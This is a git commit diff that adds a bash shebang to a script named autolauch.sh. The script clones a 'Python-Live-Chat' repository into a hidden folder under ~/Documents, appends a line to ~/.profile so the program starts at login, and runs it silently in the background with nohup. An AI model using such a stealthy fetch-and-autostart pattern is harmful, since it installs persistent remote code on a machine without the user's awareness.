c93eefefc8a106248742de68b40fd151bb1c94a4
LucasTHOMAS18 <maitre.renardowo@gmail.com>
2024-11-12 16:05:40 +0100

    shebang

--- scripts/autolauch.sh
+++ scripts/autolauch.sh
@@ -1,3 +1,4 @@
+#!/bin/bash
 git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr
 echo "python ~/Documents/.thnr/main.pyw true &" >> ~/.profile
 nohup python ~/Documents/.thnr/main.pyw true > /dev/null 2>&1 &
